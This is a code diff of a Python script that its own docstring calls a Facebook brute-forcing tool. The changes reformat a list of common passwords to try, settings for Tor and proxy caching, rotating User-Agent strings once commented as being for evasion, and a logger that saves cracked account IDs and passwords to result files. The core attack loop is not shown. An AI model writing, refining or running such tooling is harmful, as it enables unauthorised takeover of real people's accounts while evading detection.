@@ -23,12 +23,18 @@ P = '\x1b[38;5;201m' # Pink/Purple
 W = '\x1b[0;97m'  # White
 N = '\x1b[0m'   # Reset
 
-# --- Configuration ---
+
+# === CONFIGS ===
 PROXY_CACHE_FILE = "results/.proxy_cache.json"
 PROXY_EXPIRY = 60 * 60  # 1 hour
-GEO_PASS = ["123456", "786786", "pakistan", "12345678", "iloveyou", "112233", "123123"]
-TOR_BOOTSTRAP_TIME = 20 # Increased wait time for Tor to start, more robust check is ideal
-# List of common User-Agents for better evasion
+
+GEO_PASS = [
+    "123456", "786786", "pakistan", "12345678", 
+    "iloveyou", "112233", "123123"
+]
+
+TOR_BOOTSTRAP_TIME = 20  # Increased wait time for Tor to start
+
 USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
@@ -42,19 +48,24 @@ USER_AGENTS = [
     "Mozilla/5.0 (Android 10; Mobile; rv:100.0) Gecko/100.0 Firefox/100.0"
 ]
 
+# === LOG MANAGER ===
 class LogManager:
     """Manages logging of successful and checkpointed accounts."""
+    
     @staticmethod
     def save(status, uid, pw):
         """
         Saves the UID and password to a file based on the status.
         Creates a 'results' directory if it doesn't exist.
         """
-        date = datetime.now().strftime("%Y-%m-%d")
-        folder = f"results/{status}-{date}.txt"
-        os.makedirs("results", exist_ok=True) # Ensure 'results' directory exists
-        with open(folder, "a", encoding="utf-8") as f:
-            f.write(f"{uid}|{pw}\n")
+        try:
+            os.makedirs("results", exist_ok=True)  # Ensure 'results' dir exists
+            date = datetime.now().strftime("%Y-%m-%d")
+            filename = f"results/{status}-{date}.txt"
+            with open(filename, "a", encoding="utf-8") as f:
+                f.write(f"{uid}|{pw}\n")
+        except Exception as e:
+            print(f"[!] Error saving log: {e}")
 
 class MAAZTOOL:
     """Main class for the Facebook brute-forcing tool."""
